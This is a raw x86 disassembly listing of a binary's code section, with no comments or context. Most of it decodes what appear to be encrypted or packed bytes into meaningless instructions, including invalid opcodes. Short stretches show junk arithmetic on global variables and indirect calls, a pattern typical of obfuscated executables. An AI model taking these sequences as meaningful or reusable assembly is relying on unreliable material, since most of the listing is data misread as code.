  4035a7:	add    DWORD PTR [esi-0x4a538e4d],esi
  4035ad:	xlat   BYTE PTR ds:[ebx]
  4035ae:	pop    ds
  4035af:	neg    edi
  4035b1:	std    
  4035b2:	out    0x12,al
  4035b4:	enter  0x58be,0x15
  4035b8:	sub    al,0xb
  4035bb:	jg     0x4035d1
  4035bd:	jnp    0x40360a
  4035bf:	jno    0x403619
  4035c1:	jmp    0xc5e4:0x43243018
  4035c8:	test   ch,ch
  4035ca:	in     eax,dx
  4035cb:	mov    esp,0xf5cccb09
  4035d0:	cwde   
  4035d1:	jl     0x403639
  4035d3:	cmc    
  4035d4:	les    eax,FWORD PTR [ebp+0x40]
  4035d7:	inc    ebp
  4035d8:	and    al,0xd
  4035da:	push   esi
  4035db:	call   0x36c:0x4aef50c0
  4035e2:	cwde   
  4035e3:	sbb    al,0xd2
  4035e5:	or     BYTE PTR [eax+ebp*1-0x415afee0],ah
  4035ec:	aad    0x77
  4035ee:	jo     0x4035db
  4035f0:	or     al,0xd
  4035f2:	mov    bh,0x72
  4035f4:	addr16 inc esp
  4035f6:	ror    DWORD PTR [eax+0x57],cl
  4035f9:	xchg   edi,eax
  4035fa:	sbb    BYTE PTR [esi-0x64],0x51
  4035fe:	and    eax,0xd37cdf53
  403603:	in     al,0x45
  403605:	fs sti 
  403607:	xchg   ecx,eax
  403608:	cdq    
  403609:	sbb    BYTE PTR ds:0x285edfe0,ch
  40360f:	mov    DWORD PTR [ebp+eax*8-0x1a230ecd],edi
  403616:	push   ebp
  403617:	xchg   edi,eax
  403618:	xor    eax,0xe9725674
  40361d:	test   BYTE PTR ds:0x73fac5ff,ch
  403623:	aam    0xdc
  403625:	ror    BYTE PTR [ebx-0x372b9e49],0x59
  40362c:	or     bl,BYTE PTR [ecx+0x4ea2e578]
  403632:	jne    0x4036a4
  403634:	ins    DWORD PTR es:[edi],dx
  403635:	and    ch,bh
  403637:	out    0x56,eax
  403639:	or     edi,DWORD PTR [eax-0x52]
  40363c:	ret    0xa849
  40363f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403640:	je     0x40362c
  403642:	push   0x580644d9
  403647:	push   0x55
  403649:	mov    eax,ds:0x78e17e4a
  40364e:	mov    edx,0x4feae523
  403653:	gs push ds
  403655:	inc    edx
  403656:	ror    BYTE PTR [ebp-0x55347e3f],1
  40365c:	xchg   edi,eax
  40365d:	dec    edi
  40365e:	inc    eax
  40365f:	js     0x40369d
  403661:	pop    esp
  403662:	xchg   edx,eax
  403663:	in     eax,dx
  403664:	inc    esp
  403665:	and    ebp,DWORD PTR [edi+0x2c]
  403668:	lock ret 
  40366a:	sbb    DWORD PTR [esi-0x34],esp
  40366d:	adc    eax,0x1af2c81d
  403672:	pushf  
  403673:	out    0xb8,eax
  403675:	inc    ecx
  403676:	mov    ds:0x1c6a6d7,al
  40367b:	xchg   edx,eax
  40367c:	ret    
  40367d:	test   eax,0x9ab871c8
  403682:	pop    edx
  403683:	jg     0x403606
  403685:	neg    ebx
  403687:	repz retf 
  403689:	xor    bh,BYTE PTR [edi+0x3a]
  40368c:	inc    edx
  40368d:	les    edi,FWORD PTR [edx-0x25]
  403690:	pop    ebp
  403691:	mov    WORD PTR [esi],es
  403693:	xor    dl,BYTE PTR [esi-0x2f]
  403696:	ss mov dh,0x91
  403699:	xchg   ebp,eax
  40369a:	fsubr  QWORD PTR [eax+0x5584a412]
  4036a0:	jmp    0xf1d3:0xcc30341b
  4036a7:	outs   dx,BYTE PTR ds:[esi]
  4036a8:	icebp  
  4036a9:	rcr    cl,1
  4036ab:	fidivr WORD PTR [esi]
  4036ad:	repnz aas 
  4036af:	add    DWORD PTR [ebx+edx*1],esi
  4036b2:	dec    ecx
  4036b3:	or     DWORD PTR [ebp+0x4e45c38d],esp
  4036b9:	test   BYTE PTR [esi+edi*2],0x54
  4036bd:	jo     0x403646
  4036bf:	fnstsw ax
  4036c1:	mov    al,ds:0xc460f653
  4036c6:	jb     0x4036ff
  4036c8:	dec    eax
  4036c9:	dec    ebp
  4036ca:	xor    BYTE PTR [eax],ch
  4036cc:	sbb    ch,0x3c
  4036cf:	sub    edi,DWORD PTR ds:0x6c50eeed
  4036d5:	icebp  
  4036d6:	jo     0x4036e0
  4036d8:	shl    DWORD PTR [edi],0x30
  4036db:	sbb    al,0x2c
  4036dd:	aad    0x1f
  4036df:	and    DWORD PTR [eax],ebx
  4036e1:	dec    esp
  4036e2:	fs pop edi
  4036e4:	aaa    
  4036e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036e6:	pop    esi
  4036e7:	dec    ecx
  4036e8:	adc    DWORD PTR [edi+eiz*2],esi
  4036eb:	int3   
  4036ec:	jbe    0x4036b4
  4036ee:	int3   
  4036ef:	dec    esi
  4036f0:	inc    esi
  4036f1:	xchg   ecx,eax
  4036f2:	add    DWORD PTR [esi+0x49],0xa3609bb
  4036f9:	arpl   WORD PTR [edx+edx*2-0x43c152a1],si
  403700:	xchg   BYTE PTR ds:0x2193c35d,dh
  403706:	dec    ecx
  403707:	inc    edi
  403708:	dec    eax
  403709:	inc    ecx
  40370a:	xor    DWORD PTR [edi+0x79d6103c],0x2edc57ae
  403714:	fwait
  403715:	loope  0x4036f3
  403717:	fs in  eax,0x2e
  40371a:	out    0xe9,eax
  40371c:	push   ss
  40371d:	inc    ebp
  40371e:	shl    BYTE PTR [edi+0x24bdb6bb],1
  403724:	aas    
  403725:	je     0x40377f
  403727:	cmp    esi,DWORD PTR [esi]
  403729:	inc    ebx
  40372a:	push   edi
  40372b:	call   0x40e38b72
  403730:	jnp    0x40374c
  403732:	cld    
  403733:	or     eax,0xba3ba2e1
  403738:	cmp    al,0x8b
  40373a:	test   eax,0x9ce7d296
  40373f:	bound  eax,QWORD PTR [edi]
  403741:	cld    
  403742:	jle    0x40378f
  403744:	ins    DWORD PTR es:[edi],dx
  403745:	cmp    al,BYTE PTR [eax+0x3bcf12a5]
  40374b:	shr    BYTE PTR [ebx],1
  40374d:	and    DWORD PTR [ebx+0xd],esp
  403750:	leave  
  403751:	nop
  403752:	adc    esp,DWORD PTR [edx+0x34a3242]
  403758:	push   0xac70d3a1
  40375d:	xor    eax,DWORD PTR [edx]
  40375f:	pop    ds
  403760:	xlat   BYTE PTR ds:[ebx]
  403761:	xor    DWORD PTR [ebx+0x131bf1df],esi
  403767:	repz mov dh,0x3a
  40376a:	(bad)
  40376f:	out    dx,al
  403770:	aad    0x8e
  403772:	mov    bl,0xfe
  403774:	cmp    ebx,ebx
  403776:	mov    dh,0x2a
  403778:	mov    WORD PTR ds:0x8b5f18a3,?
  40377e:	fnstenv [edx]
  403780:	jo     0x40373a
  403782:	pop    esi
  403783:	dec    edi
  403784:	mov    gs,edx
  403786:	jp     0x4037f4
  403788:	push   ebp
  403789:	push   ebx
  40378a:	and    esi,eax
  40378c:	ja     0x4037dd
  40378e:	sub    eax,0xd4edbd4b
  403793:	(bad)  
  403794:	mov    ebx,0xbefbed68
  403799:	sbb    ebp,0x6c
  40379c:	mov    DWORD PTR [edx+0x2b73a93],ebp
  4037a2:	mov    BYTE PTR [ebx+0x176f37f8],bh
  4037a8:	add    DWORD PTR [eax+0x63],esp
  4037ab:	jge    0x4037be
  4037ad:	push   ecx
  4037ae:	xor    al,0x46
  4037b0:	into   
  4037b1:	jae    0x403742
  4037b3:	cmp    cl,dh
  4037b5:	fisub  WORD PTR [edx-0x16]
  4037b8:	adc    bh,al
  4037ba:	outs   dx,BYTE PTR ds:[esi]
  4037bb:	fs popa 
  4037bd:	mov    al,ds:0x8e407cb0
  4037c2:	mov    cl,0x61
  4037c4:	adc    edx,esp
  4037c6:	inc    ebx
  4037c7:	cmc    
  4037c8:	or     al,0xe0
  4037ca:	rol    eax,0x8a
  4037cd:	jb     0x403824
  4037cf:	in     eax,dx
  4037d0:	int3   
  4037d1:	jae    0x403820
  4037d3:	or     eax,0xfd0da2c7
  4037d8:	in     al,dx
  4037d9:	jb     0x4037c7
  4037db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037dc:	cmp    BYTE PTR [esi+0x2576d918],dh
  4037e2:	mov    DWORD PTR [esi],0x16aa8a99
  4037e8:	pop    ss
  4037e9:	jns    0x403799
  4037eb:	lock sub DWORD PTR [esi],edi
  4037ee:	repz aaa 
  4037f0:	inc    edi
  4037f1:	inc    edi
  4037f2:	and    BYTE PTR [edx+eiz*1],cl
  4037f5:	imul   edi,esi,0x61
  4037f8:	pop    edx
  4037f9:	xor    dh,dh
  4037fb:	xor    BYTE PTR [ebx],ch
  4037fd:	adc    eax,0x7af573f4
  403802:	xchg   ebp,eax
  403803:	daa    
  403804:	fnstenv [esp+ebp*1-0x58e97c6]
  40380b:	push   esi
  40380c:	mov    WORD PTR [edi-0x5d49bce],cs
  403812:	adc    eax,0x9eb6edb6
  403817:	mov    ebx,0xa7616c49
  40381c:	bound  edx,QWORD PTR [ebp-0x2]
  40381f:	lods   eax,DWORD PTR ds:[esi]
  403820:	sar    BYTE PTR [esi+0x3b5f1042],cl
  403826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403827:	sahf   
  403828:	cdq    
  403829:	adc    BYTE PTR [eax],0xb4
  40382c:	mov    ecx,0x9834582c
  403831:	lods   al,BYTE PTR ds:[esi]
  403832:	popa   
  403833:	lahf   
  403834:	sbb    al,0xd5
  403836:	xor    eax,edx
  403838:	push   es
  403839:	mov    cl,0x16
  40383b:	or     edi,DWORD PTR [ecx+edi*8-0x389ddaa9]
  403842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403843:	adc    edi,eax
  403845:	adc    ecx,DWORD PTR [ebx+0x1967bea9]
  40384b:	xor    DWORD PTR [ebp-0x158c1cae],edi
  403851:	jo     0x4038c0
  403853:	xchg   esi,eax
  403854:	mov    es,WORD PTR [ebx+0x72407d78]
  40385a:	cmp    ebx,0x419b529d
  403860:	leave  
  403861:	mov    ah,0x71
  403863:	sbb    cl,BYTE PTR [ebx]
  403865:	cmp    al,0x8e
  403867:	cld    
  403868:	retf   
  403869:	xchg   esi,eax
  40386a:	pop    es
  40386b:	mov    al,ds:0xe4894110
  403870:	(bad)  
  403871:	std    
  403872:	push   ds
  403873:	mov    esi,0xc76fca75
  403878:	(bad)  
  403879:	cmc    
  40387a:	dec    ecx
  40387b:	push   esp
  40387c:	cdq    
  40387d:	repnz cmc 
  40387f:	jge    0x4038fb
  403881:	ins    BYTE PTR es:[edi],dx
  403882:	aaa    
  403883:	bound  edx,QWORD PTR [ecx-0x18]
  403886:	icebp  
  403887:	push   ebx
  403888:	les    edx,FWORD PTR cs:[ebx]
  40388b:	ror    ecx,1
  40388d:	and    ch,cl
  40388f:	cmp    dh,BYTE PTR [ebp+0x6a]
  403892:	add    bl,BYTE PTR [ebx+0x429455d7]
  403898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403899:	jp     0x403906
  40389b:	or     eax,0x4f955ad5
  4038a0:	cwde   
  4038a1:	xor    DWORD PTR [ecx+0x6c],edi
  4038a4:	add    al,0xf8
  4038a6:	or     DWORD PTR [esi+0x2915b073],0x748defd
  4038b0:	dec    esi
  4038b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038b2:	mov    edi,0x3cc35470
  4038b7:	into   
  4038b8:	stc    
  4038b9:	inc    esi
  4038ba:	mov    ebx,0xc298e647
  4038bf:	xor    esi,DWORD PTR [ebx+0x25]
  4038c2:	inc    ecx
  4038c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038c4:	push   edx
  4038c5:	lds    ecx,FWORD PTR [edx]
  4038c7:	pop    esi
  4038c8:	add    eax,0xea4e2bcd
  4038cd:	dec    esp
  4038ce:	in     al,dx
  4038cf:	or     edx,DWORD PTR [ebp+0x2f1e4f8d]
  4038d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038d6:	loopne 0x4038ed
  4038d8:	push   esi
  4038d9:	sbb    al,0xba
  4038db:	icebp  
  4038dc:	push   ebx
  4038dd:	sub    ah,BYTE PTR [eax-0x78]
  4038e0:	jno    0x4038d6
  4038e2:	call   0x2d1:0xac0f0c21
  4038e9:	xor    DWORD PTR ds:0x428475,0x428525
  4038f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4038f6:	mov    ecx,DWORD PTR [ebp+0x18]
  4038f9:	xor    DWORD PTR ds:0x428409,0x428531
  403903:	xor    DWORD PTR [ebp-0x1c],edi
  403906:	adc    DWORD PTR ds:0x4283f5,0x4aad
  403910:	shl    ecx,0x1e
  403913:	not    DWORD PTR ds:0x4283bd
  403919:	xor    ecx,ecx
  40391b:	sub    DWORD PTR ds:0x428509,0x450d
  403925:	or     ecx,DWORD PTR [ebp-0x1c]
  403928:	jmp    0x403cc9
  40392d:	cdq    
  40392e:	jbe    0x40398b
  403930:	fidivr WORD PTR [ebx+eiz*8-0x40084545]
  403937:	mul    BYTE PTR [edi+eiz*4-0x426f2e64]
  40393e:	in     eax,dx
  40393f:	mov    esi,0xbec4bdbe
  403944:	mov    esi,0xc41701af
  403949:	fbld   TBYTE PTR [edx+0x68e49936]
  40394f:	pop    ebp
  403950:	int    0x6f
  403952:	jge    0x403986
  403954:	fadd   QWORD PTR [edi-0x5f]
  403957:	and    BYTE PTR [ebx-0x2b],0x3b
  40395b:	scas   al,BYTE PTR es:[edi]
  40395c:	adc    bl,BYTE PTR [eax]
  40395e:	jae    0x40395b
  403960:	sub    DWORD PTR [esi],eax
  403962:	pop    edi
  403963:	xchg   ecx,eax
  403964:	outs   dx,BYTE PTR ds:[esi]
  403965:	loope  0x4039db
  403967:	aad    0xd1
  403969:	imul   ebp,edx,0x7c
  40396c:	sub    edx,DWORD PTR ds:[edi-0x6db4adac]
  403973:	sbb    DWORD PTR [esi-0x36c02341],ebx
  403979:	outs   dx,BYTE PTR ds:[esi]
  40397a:	sub    al,0x33
  40397c:	jne    0x4039f9
  40397e:	cmp    al,0x26
  403980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403981:	pop    ecx
  403982:	pop    ebp
  403983:	add    DWORD PTR [ebp+ecx*4-0x158e4cf4],edx
  40398a:	daa    
  40398b:	push   ss
  40398c:	dec    esi
  40398d:	ins    BYTE PTR es:[edi],dx
  40398e:	jo     0x403925
  403990:	dec    ebp
  403991:	dec    esi
  403992:	xor    ebx,edi
  403994:	mov    eax,ds:0x12a5ca86
  403999:	leave  
  40399a:	ds stos BYTE PTR es:[edi],al
  40399c:	setbe  BYTE PTR [ebx-0x10c6244c]
  4039a3:	retf   0x4049
  4039a6:	inc    ebx
  4039a7:	sti    
  4039a8:	mov    BYTE PTR [ebp+0xace63b5],al
  4039ae:	retf   
  4039af:	add    BYTE PTR [ecx+0x68],dl
  4039b2:	sub    eax,0x6b9aebba
  4039b7:	outs   dx,BYTE PTR ds:[esi]
  4039b8:	jmp    FWORD PTR [ecx+0x7edac8a7]
  4039be:	add    BYTE PTR [eax-0x2f498c7b],dl
  4039c4:	aas    
  4039c5:	punpcklwd mm3,DWORD PTR [edx-0x10f6e4f6]
  4039cc:	retf   0x2852
  4039cf:	out    dx,eax
  4039d0:	xor    esp,DWORD PTR [esi-0x35b4c918]
  4039d6:	imul   edx,ebp,0x2323ecd8
  4039dc:	inc    ebp
  4039dd:	test   BYTE PTR [edx+eax*2+0x46479b5a],bh
  4039e4:	mov    cl,0x6e
  4039e6:	rcr    DWORD PTR [eax-0x67527a1c],1
  4039ec:	arpl   cx,di
  4039ee:	adc    BYTE PTR [ebp+0x9],ah
  4039f1:	scas   al,BYTE PTR es:[edi]
  4039f2:	outs   dx,DWORD PTR ds:[esi]
  4039f3:	jnp    0x403975
  4039f5:	cdq    
  4039f6:	sti    
  4039f7:	sub    DWORD PTR [ebp+0x2a73478b],0xfffffff1
  4039fe:	out    dx,al
  4039ff:	cdq    
  403a00:	imul   esi,DWORD PTR [edx-0x10],0xf
  403a04:	div    DWORD PTR [edi-0x4f]
  403a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a08:	pusha  
  403a09:	in     al,0xbc
  403a0b:	fmul   DWORD PTR [ebx-0x79]
  403a0e:	xor    eax,0xd9fe760f
  403a13:	cmp    bh,BYTE PTR [edi-0x79]
  403a16:	jbe    0x4039ac
  403a18:	jge    0x4039ae
  403a1a:	popf   
  403a1b:	and    al,0x98
  403a1d:	sbb    eax,0xffc70896
  403a22:	inc    ecx
  403a23:	sbb    dl,dl
  403a25:	mov    ah,0x14
  403a27:	push   ecx
  403a28:	xchg   ecx,eax
  403a29:	jo     0x403a61
  403a2b:	jg     0x4039c6
  403a2d:	or     al,0x54
  403a2f:	jne    0x4039c9
  403a31:	mov    dl,ch
  403a33:	sbb    eax,DWORD PTR [esi-0x5cc6174]
  403a39:	ins    BYTE PTR es:[edi],dx
  403a3a:	push   0xaeb8c168
  403a3f:	imul   edi,DWORD PTR [ebx-0x51],0x85f814a9
  403a46:	sbb    ecx,DWORD PTR [ecx]
  403a48:	xchg   ebp,eax
  403a49:	lods   eax,DWORD PTR ds:[esi]
  403a4a:	inc    edi
  403a4b:	sub    cl,BYTE PTR [eax+0x645bae2]
  403a51:	inc    edx
  403a52:	movlps QWORD PTR [ecx-0x6d],xmm4
  403a56:	and    DWORD PTR [esi+0x64],ebp
  403a59:	sti    
  403a5a:	ficom  WORD PTR [ebp-0x80]
  403a5d:	enter  0x81f0,0x5
  403a61:	pusha  
  403a62:	not    BYTE PTR [ebx]
  403a64:	rcl    edi,1
  403a66:	cwde   
  403a67:	jmp    0x403a9b
  403a69:	sub    edx,DWORD PTR [eax]
  403a6b:	dec    eax
  403a6c:	cmp    DWORD PTR [eax],edi
  403a6e:	sahf   
  403a6f:	aad    0x43
  403a71:	xchg   ebp,eax
  403a72:	xor    DWORD PTR [esi+esi*2-0x79ff90ac],esi
  403a79:	cmp    edi,DWORD PTR [edx-0x51]
  403a7c:	cmp    BYTE PTR [ebp-0x5e],cl
  403a7f:	arpl   dx,cx
  403a81:	adc    al,0xa
  403a83:	add    BYTE PTR [edi+ecx*1],ch
  403a86:	bound  eax,QWORD PTR [ebp+0x2f9f3dd8]
  403a8c:	adc    al,0xde
  403a8e:	cmc    
  403a8f:	jmp    0x5774:0x6f15e1b
  403a96:	pop    edx
  403a97:	pop    ebx
  403a98:	pop    ss
  403a99:	jge    0x403ab7
  403a9b:	retf   
  403a9c:	rol    DWORD PTR [edi-0x3f0d8251],0x41
  403aa3:	rol    DWORD PTR [esi-0x53746cbd],0xce
  403aaa:	jg     0x403aea
  403aac:	loop   0x403adb
  403aae:	aaa    
  403aaf:	dec    eax
  403ab0:	xor    DWORD PTR [ecx-0x4],ebx
  403ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ab4:	dec    esi
  403ab5:	xor    BYTE PTR [edi+0x4c],bl
  403ab8:	adc    al,0x1f
  403aba:	mov    ecx,0x6aa64c45
  403abf:	arpl   WORD PTR [esi],ax
  403ac1:	sar    DWORD PTR [ebx+0x7d880c93],0x28
  403ac8:	fsubp  st(4),st
  403aca:	jnp    0x403aa1
  403acc:	hlt    
  403acd:	jne    0x403a69
  403acf:	ret    0xf5ce
  403ad2:	(bad)  
  403ad3:	adc    BYTE PTR [eax-0x35],al
  403ad6:	int    0x25
  403ad8:	adc    al,BYTE PTR [eax]
  403ada:	jle    0x403ae3
  403adc:	sub    esi,edi
  403ade:	aam    0xe4
  403ae0:	data16 aam 0x68
  403ae3:	stos   BYTE PTR es:[edi],al
  403ae4:	push   ebp
  403ae5:	(bad)  
  403ae6:	push   cs
  403ae7:	dec    ebx
  403ae8:	xor    dl,dl
  403aea:	mov    DWORD PTR [eax],ebx
  403aec:	lahf   
  403aed:	pop    eax
  403aee:	xor    eax,0x3ac8a8ca
  403af3:	pushf  
  403af4:	dec    esi
  403af5:	aaa    
  403af6:	aas    
  403af7:	popf   
  403af8:	fadd   QWORD PTR [eax]
  403afa:	inc    sp
  403afc:	jmp    0x403b38
  403afe:	mov    ch,0x5e
  403b00:	jecxz  0x403abe
  403b02:	mov    dl,ch
  403b04:	dec    edi
  403b05:	fld    TBYTE PTR ds:0xbd19eee0
  403b0b:	fistp  DWORD PTR [edi-0x252e62f0]
  403b11:	add    BYTE PTR [eax+eax*2],0xda
  403b15:	fld    TBYTE PTR [ebx-0x24]
  403b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b19:	ja     0x403b03
  403b1b:	dec    esp
  403b1c:	push   es
  403b1d:	add    al,0xdd
  403b1f:	sub    eax,0xcace623
  403b24:	dec    eax
  403b25:	push   esi
  403b26:	les    edx,FWORD PTR [eax-0x33]
  403b29:	pop    ds
  403b2a:	ss mov ah,0xc5
  403b2d:	adc    eax,0xf406e773
  403b32:	adc    al,0x87
  403b34:	mov    ebx,0xe50634e5
  403b39:	pop    edi
  403b3a:	stos   DWORD PTR es:[edi],eax
  403b3b:	ror    BYTE PTR [eax+0x66],cl
  403b3e:	push   es
  403b3f:	stos   BYTE PTR es:[edi],al
  403b40:	mov    esp,0xc28751df
  403b45:	mov    al,bl
  403b47:	jmp    0x403b89
  403b49:	xor    al,0x49
  403b4b:	pop    ss
  403b4c:	das    
  403b4d:	xor    ah,BYTE PTR [esi+0x76e9481]
  403b53:	push   edi
  403b54:	jmp    0x403b87
  403b56:	or     ch,ch
  403b58:	push   esi
  403b59:	mov    eax,ds:0xdd19c4dd
  403b5e:	and    DWORD PTR [ecx],eax
  403b60:	push   ecx
  403b61:	push   es
  403b62:	jmp    0x9b4e48c8
  403b67:	ins    BYTE PTR es:[edi],dx
  403b68:	call   0xced1:0x15ec8a0
  403b6f:	test   al,0x27
  403b71:	xchg   ebp,eax
  403b72:	std    
  403b73:	pop    ebx
  403b74:	ffree  st(4)
  403b76:	mov    ch,0xb7
  403b78:	fxch   st(0)
  403b7a:	cmp    DWORD PTR [edi],ebx
  403b7c:	sub    edx,DWORD PTR [ecx]
  403b7e:	jmp    0x62e5fe97
  403b83:	fcom   QWORD PTR [ecx+0x2f]
  403b86:	inc    edx
  403b87:	mov    dh,0x54
  403b89:	xor    BYTE PTR [ecx+0x32],0xa6
  403b8d:	mov    esp,0x28d017
  403b92:	add    eax,0x82cb6ccf
  403b97:	push   ecx
  403b98:	xchg   esp,eax
  403b99:	outs   dx,BYTE PTR ds:[esi]
  403b9a:	add    al,0x8b
  403b9c:	jmp    0xbf95a28f
  403ba1:	ins    DWORD PTR es:[edi],dx
  403ba2:	fwait
  403ba3:	hlt    
  403ba4:	jl     0x403ba6
  403ba6:	xor    esp,DWORD PTR [ebx+0x4d]
  403ba9:	pop    eax
  403baa:	xor    DWORD PTR [ecx+eax*1+0x42],eax
  403bae:	pop    edi
  403baf:	push   esp
  403bb0:	cmp    cl,BYTE PTR [ebx]
  403bb2:	ret    
  403bb3:	lahf   
  403bb4:	scas   al,BYTE PTR es:[edi]
  403bb5:	lock push esi
  403bb7:	rcl    BYTE PTR [esi+0x65],cl
  403bba:	cdq    
  403bbb:	popf   
  403bbc:	mov    esi,0x881015e7
  403bc1:	add    dl,BYTE PTR [eax]
  403bc3:	inc    edi
  403bc4:	scas   eax,DWORD PTR es:[edi]
  403bc5:	push   ds
  403bc6:	dec    esp
  403bc7:	mov    ah,bl
  403bc9:	jno    0x403bb0
  403bcb:	out    dx,eax
  403bcc:	push   es
  403bcd:	call   0x5e0aa353
  403bd2:	lahf   
  403bd3:	jp     0x403baf
  403bd5:	mov    ecx,0xb76f797e
  403bda:	jp     0x403ba6
  403bdc:	fisttp DWORD PTR [esi]
  403bde:	test   BYTE PTR [edx+0x65],0xb6
  403be2:	sub    al,0xc9
  403be4:	in     eax,0xbe
  403be6:	mov    ah,0x8b
  403be8:	jae    0x403b84
  403bea:	out    0xda,eax
  403bec:	retf   
  403bed:	mov    cl,0x44
  403bef:	cwde   
  403bf0:	adc    DWORD PTR ds:0x6be005f4,esp
  403bf6:	or     dl,ch
  403bf8:	je     0x403c3c
  403bfa:	and    DWORD PTR [edi+esi*1+0x1f41c235],eax
  403c01:	dec    edi
  403c02:	sub    al,0x32
  403c04:	enter  0x2f6b,0xa0
  403c08:	pop    es
  403c09:	enter  0x6c97,0xa3
  403c0d:	iret   
  403c0e:	cmp    bl,BYTE PTR [esi-0x11]
  403c11:	xor    eax,0xa5a118a
  403c16:	and    al,0x24
  403c18:	daa    
  403c19:	es loope 0x403bef
  403c1c:	or     al,0x40
  403c1e:	inc    edx
  403c1f:	out    0x0,eax
  403c21:	test   esp,0xe5ebea1c
  403c27:	and    DWORD PTR [edx-0x42],ebp
  403c2a:	bound  ebx,QWORD PTR ds:[esi+ebp*8-0xca4e6db]
  403c32:	ficom  WORD PTR [ebx+0x41]
  403c35:	(bad)  
  403c36:	sbb    DWORD PTR [ecx+0x77819300],eax
  403c3c:	repnz adc bh,0x87
  403c40:	or     eax,0x6c2fce30
  403c45:	cmc    
  403c46:	out    0xf3,eax
  403c48:	add    ecx,DWORD PTR [edi-0x226458b8]
  403c4e:	add    al,0xa2
  403c50:	xchg   esi,eax
  403c51:	cmp    ebp,esi
  403c53:	pop    ss
  403c54:	and    al,0x41
  403c56:	arpl   WORD PTR [esi+esi*1+0x771fb883],cx
  403c5d:	dec    ebx
  403c5e:	pop    esp
  403c5f:	ret    0xca0c
  403c62:	inc    esi
  403c63:	and    eax,0x9dd01778
  403c68:	cmp    ch,BYTE PTR [ebp-0xc]
  403c6b:	repnz fwait
  403c6d:	jge    0x403c71
  403c6f:	xor    eax,0x2935927f
  403c74:	inc    eax
  403c75:	add    cl,dh
  403c77:	or     dh,BYTE PTR [esi]
  403c79:	inc    edi
  403c7a:	xor    BYTE PTR ds:0xabb64606,dl
  403c80:	mov    ebx,DWORD PTR [edi+0x23]
  403c83:	sbb    esp,eax
  403c85:	xor    DWORD PTR [ebx+0x1152ed5],0x4caab0fd
  403c8f:	push   ecx
  403c90:	aam    0xb0
  403c92:	xchg   ecx,eax
  403c93:	fst    DWORD PTR [edx+0x1f626d80]
  403c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c9a:	gs jmp 0x87ee:0xcd4078a7
  403ca2:	xchg   edi,eax
  403ca3:	xchg   ebx,eax
  403ca4:	imul   ecx,esp,0xffffff89
  403ca7:	xlat   BYTE PTR ds:[ebx]
  403ca8:	test   BYTE PTR [edx+0x32],ch
  403cab:	mov    dh,0xcd
  403cad:	mov    al,ds:0x7a1fe356
  403cb2:	ins    BYTE PTR es:[edi],dx
  403cb3:	pop    edx
  403cb4:	ins    DWORD PTR es:[edi],dx
  403cb5:	pop    ebp
  403cb6:	cli    
  403cb7:	xor    BYTE PTR [edi],dh
  403cb9:	dec    ebx
  403cba:	push   cs
  403cbb:	or     esp,DWORD PTR [eax]
  403cbd:	and    eax,0x5c29298f
  403cc2:	repz push cs
  403cc4:	fimul  DWORD PTR [esi-0x3e8f4089]
  403cca:	jmp    0x83c1:0x15b70f02
  403cd1:	inc    edx
  403cd2:	add    BYTE PTR [ecx],ah
  403cd4:	adc    eax,0x4283bd
  403cd9:	mov    edx,DWORD PTR [ebp+0x1c]
  403cdc:	cmp    DWORD PTR ds:0x428425,0x0
  403ce3:	mov    edx,0xb30
  403ce8:	not    DWORD PTR ds:0x4282ed
  403cee:	jmp    0x403db9
  403cf3:	mov    DWORD PTR ds:0x4282f1,0x7955
  403cfd:	mov    DWORD PTR ds:0x42847d,0x3fbe
  403d07:	cmp    DWORD PTR ds:0x428425,0x0
  403d0e:	jae    0x403d49
  403d14:	push   0x2165
  403d19:	push   0x209b
  403d1e:	push   0x61ab
  403d23:	push   0x585a
  403d28:	push   DWORD PTR [ebp-0x14]
  403d2b:	call   DWORD PTR ds:0x42e0c0
  403d31:	xor    DWORD PTR ds:0x4283bd,edi
  403d37:	xor    DWORD PTR ds:0x4283c9,edi
  403d3d:	xor    edx,DWORD PTR ds:0x428429
  403d43:	sub    DWORD PTR ds:0x428315,edi
  403d49:	sbb    DWORD PTR ds:0x428431,0x3090
  403d53:	sub    DWORD PTR ds:0x4283e1,ecx
  403d59:	xor    DWORD PTR ds:0x42848d,edi
  403d5f:	cmp    DWORD PTR ds:0x4284fd,0x0
  403d66:	mov    edx,0x71bd
  403d6b:	not    edx
  403d6d:	jmp    0x403db9
  403d72:	mov    edx,0x37a5
  403d77:	mov    edx,0x5337
  403d7c:	cmp    DWORD PTR ds:0x4284fd,0x0
  403d83:	jle    0x403dad
  403d89:	push   0x4283f5
  403d8e:	call   DWORD PTR ds:0x42e0c4
  403d94:	mov    edx,DWORD PTR ds:0x4284d1
  403d9a:	mov    edx,DWORD PTR [edx]
  403d9c:	and    DWORD PTR ds:0x4282dd,edx
  403da2:	adc    DWORD PTR ds:0x4283d9,0x11e9
  403dac:	dec    edx
  403dad:	and    edx,0xf08
  403db3:	sub    edx,DWORD PTR ds:0x428521
  403db9:	mov    DWORD PTR [ebp-0x2c],ecx
  403dbc:	mov    ecx,DWORD PTR [esi]
  403dbe:	add    DWORD PTR ds:0x4283f5,ebx
  403dc4:	mov    edx,DWORD PTR [esi+0x4]
  403dc7:	or     DWORD PTR ds:0x4282e5,0x4282f9
  403dd1:	shrd   ecx,edx,0x2
  403dd5:	xor    DWORD PTR ds:0x428489,0x24cb
  403ddf:	shr    edx,0x2
  403de2:	and    edx,DWORD PTR ds:0x428511
  403de8:	mov    DWORD PTR [ebp-0x1c],ecx
  403deb:	mov    ecx,DWORD PTR [esi]
  403ded:	mov    edx,DWORD PTR [esi+0x4]
  403df0:	xor    DWORD PTR [ebp-0x1c],edi
  403df3:	xor    edx,edx
  403df5:	or     edx,DWORD PTR [ebp-0x1c]
